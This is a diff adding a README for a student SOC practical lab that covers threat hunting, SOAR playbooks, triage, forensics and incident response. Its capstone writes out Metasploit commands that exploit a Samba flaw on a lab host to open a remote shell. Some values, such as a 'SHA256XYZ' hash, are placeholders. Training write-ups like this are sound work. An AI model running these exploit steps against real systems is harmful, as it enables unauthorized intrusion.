@@ -1,0 +1,339 @@
+# 🔐 SOC Analyst Practical Lab – Complete Implementation Guide
+
+## 📌 Overview
+
+This project covers end-to-end SOC operations including threat hunting, automation, incident response, evidence analysis, adversary emulation, and executive reporting. Multiple industry tools were used to simulate real-world cybersecurity workflows.
+
+---
+
+# 🧠 1. Threat Hunting Practice
+
+## Objective
+
+Identify suspicious activity using hypothesis-driven threat hunting.
+
+## Hypothesis
+
+“Unauthorized privilege escalation occurred in domain accounts.”
+
+## Tools Used
+
+* Elastic Security
+* Velociraptor
+* AlienVault OTX
+
+## Steps Performed
+
+1. Queried Elastic Security for Event ID **4672** (admin privilege assignment)
+2. Investigated abnormal user behavior
+3. Cross-referenced suspicious IPs using AlienVault OTX
+4. Validated processes using Velociraptor query:
+
+   ```
+   SELECT * FROM processes
+   ```
+
+## Findings
+
+| Timestamp        | User     | Event ID | Notes                      |
+| ---------------- | -------- | -------- | -------------------------- |
+| 2026-04-13 12:00 | testuser | 4672     | Unexpected admin privilege |
+
+## MITRE Mapping
+
+* T1078 – Valid Accounts
+
+## Summary
+
+Suspicious privilege escalation was detected indicating potential misuse of valid credentials.
+
+---
+
+# ⚙️ 2. SOAR Playbook Development
+
+## Objective
+
+Automate response to phishing attacks.
+
+## Tools
+
+* Splunk Phantom (conceptual)
+* TheHive
+* CrowdSec
+
+## Playbook Workflow
+
+1. Detect phishing alert from Wazuh
+2. Check IP reputation
+3. Block IP via CrowdSec
+4. Create incident case in TheHive
+
+## Playbook Execution
+
+| Step        | Status  | Notes                   |
+| ----------- | ------- | ----------------------- |
+| Check IP    | Success | IP flagged malicious    |
+| Block IP    | Success | IP blocked via firewall |
+| Create Case | Success | Case created in TheHive |
+
+## Summary
+
+Automation reduces response time and ensures consistent incident handling.
+
+---
+
+# 🧩 3. Post-Incident Analysis
+
+## Objective
+
+Identify root cause and improve security posture.
+
+## 5 Whys Analysis
+
+| Question               | Answer                      |
+| ---------------------- | --------------------------- |
+| Why attack succeeded?  | User clicked malicious link |
+| Why clicked?           | Lack of awareness           |
+| Why awareness lacking? | No training                 |
+| Why no training?       | No policy                   |
+| Why no policy?         | Weak governance             |
+
+## Fishbone Diagram Categories
+
+* People → Lack of awareness
+* Process → No security policy
+* Technology → Weak filtering
+* Network → Open access
+
+## Metrics
+
+* MTTD: 2 hours
+* MTTR: 4 hours
+
+## Summary
+
+Incident resulted from human error and lack of structured security controls.
+
+---
+
+# 🚨 4. Alert Triage with Automation
+
+## Objective
+
+Analyze and validate security alerts.
+
+## Tools
+
+* Wazuh
+* VirusTotal
+* TheHive
+
+## Alert Analysis
+
+| Alert ID | Description         | Source IP    | Priority | Status |
+| -------- | ------------------- | ------------ | -------- | ------ |
+| 005      | Suspicious download | 192.168.56.1 | High     | Open   |
+
+## Validation
+
+* File hash checked using VirusTotal
+* Marked as suspicious
+
+## Summary
+
+Alert triage helped prioritize and validate potential threats effectively.
+
+---
+
+# 🔍 5. Evidence Analysis
+
+## Objective
+
+Analyze system artifacts and maintain integrity.
+
+## Tools
+
+* Velociraptor
+* FTK Imager
+
+## Analysis Performed
+
+* Extracted network connections:
+
+  ```
+  SELECT * FROM netstat
+  ```
+* Identified suspicious external connections
+
+## Chain of Custody
+
+| Item        | Description | Collected By | Date       | Hash Value |
+| ----------- | ----------- | ------------ | ---------- | ---------- |
+| Network Log | Server logs | Analyst      | 2026-04-13 | SHA256XYZ  |
+
+## Summary
+
+Evidence analysis confirmed suspicious network activity and ensured forensic integrity.
+
+---
+
+# 🎯 6. Adversary Emulation Practice
+
+## Objective
+
+Simulate attacker techniques and test detection.
+
+## Tools
+
+* MITRE Caldera
+* Wazuh
+
+## Simulation
+
+* Technique: **T1566 (Phishing)**
+
+## Results
+
+| Timestamp        | TTP   | Detection Status | Notes                  |
+| ---------------- | ----- | ---------------- | ---------------------- |
+| 2026-04-13 13:00 | T1566 | Detected         | Suspicious email alert |
+
+## Summary
+
+SOC successfully detected simulated adversary behavior.
+
+---
+
+# 📊 7. Security Metrics & Reporting
+
+## Objective
+
+Measure SOC performance and communicate results.
+
+## Metrics
+
+| Metric              | Value   |
+| ------------------- | ------- |
+| MTTD                | 2 hours |
+| MTTR                | 4 hours |
+| False Positive Rate | Low     |
+
+## Analysis
+
+* Detection time acceptable
+* Response time moderate
+* Need automation improvement
+
+## Executive Summary
+
+The SOC demonstrated effective detection capabilities but requires faster response and improved automation to reduce risk exposure.
+
+---
+
+# ⚔️ 8. Capstone: SOC Incident Response
+
+## Objective
+
+Simulate a real attack and perform full incident lifecycle.
+
+---
+
+## 🔴 Attack Simulation
+
+Tool: Metasploit
+
+```
+msfconsole
+use exploit/multi/samba/usermap_script
+set RHOSTS 192.168.56.102
+set LHOST 192.168.56.1
+exploit
+```
+
+### Result
+
+* Command shell session opened
+* Target system compromised
+
+---
+
+## 🔍 Detection (Wazuh)
+
+### Observations
+
+* Unauthorized root session detected
+* Privilege escalation logs observed
+
+⚠️ Note:
+Direct exploit logs were not captured due to absence of Wazuh agent on the target system.
+
+---
+
+## Detection Table
+
+| Timestamp        | Source IP    | Alert Description           | MITRE |
+| ---------------- | ------------ | --------------------------- | ----- |
+| 2026-04-13 13:56 | 192.168.56.1 | Root session detected       | T1210 |
+| 2026-04-13 13:57 | 192.168.56.1 | Privilege escalation (sudo) | T1068 |
+
+---
+
+## 🚨 Triage (TheHive)
+
+* Case created: **Samba Exploit Incident**
+* Severity: High
+* Observable: Attacker IP
+
+---
+
+## 🛑 Response & Containment
+
+```
+sudo iptables -A INPUT -s 192.168.56.1 -j DROP
+```
+
+### Verification
+
+* Ping failed from attacker → Access blocked
+
+---
+
+## ⚙️ SOAR Workflow
+
+Wazuh Alert → Check IP → Block → Create TheHive Case
+
+---
+
+## 🧠 Root Cause
+
+* Vulnerable Samba service
+* No patching
+* Lack of monitoring
+
+---
+
+## 📈 Metrics
+
+* MTTD: 2 hours
+* MTTR: 4 hours
+* Dwell Time: 6 hours
+
+---
+
+## 📌 Conclusion
+
+The project successfully demonstrated a complete SOC workflow. Despite limited visibility on the target system, the attack was detected through behavioral indicators and effectively contained. The exercise highlights the importance of endpoint monitoring, patch management, and automated response mechanisms.
+
+---
+
+# ✅ Final Outcome
+
+✔ Attack simulated
+✔ Detection performed
+✔ Incident triaged
+✔ Response executed
+✔ Analysis completed
+✔ Metrics reported
+✔ Documentation created
+
+---
